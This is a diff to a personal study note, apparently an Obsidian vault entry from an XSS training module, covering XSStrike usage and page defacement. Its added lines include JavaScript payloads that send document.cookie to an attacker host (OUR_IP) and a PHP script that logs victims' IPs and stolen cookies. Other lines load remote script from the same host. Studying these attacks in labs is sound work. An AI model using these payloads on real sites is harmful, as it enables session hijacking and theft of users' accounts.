@@ -275,6 +275,10 @@ The basic XSS Strike syntax is
 ```
 python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
 ```
+
+With our PHP webserver we can execute payloads on all fields and mark our payloads for their location. Then we will see if a field returns a call to our server. 
+![[../../Pasted image 20250603093610.png]]
+![[../../Pasted image 20250603093853.png]]
 **Defacement**
 Four main elements to change 
 - Background Color `document.body.style.background`
@@ -355,26 +359,34 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
 <script>$.getScript("http://OUR_IP")</script>
 ```
+Steal a cookie:
+```
+document.location='http://OUR_IP/index.php?c='+document.cookie;
 
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+```
+new Image().src='http://OUR_IP/index.php?c='+document.cookie
 
+<script src=http://OUR_IP/script.js></script>
+```
 
-
-
-
-
+Our PHP code to steal the cookie
+```
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
 `
 ![[../../Cross_Site_Scripting_Xss_Module_Cheat_Sheet.pdf]]
-
-
-
-
-
-
-
-
-
-
-
 
 
 ---
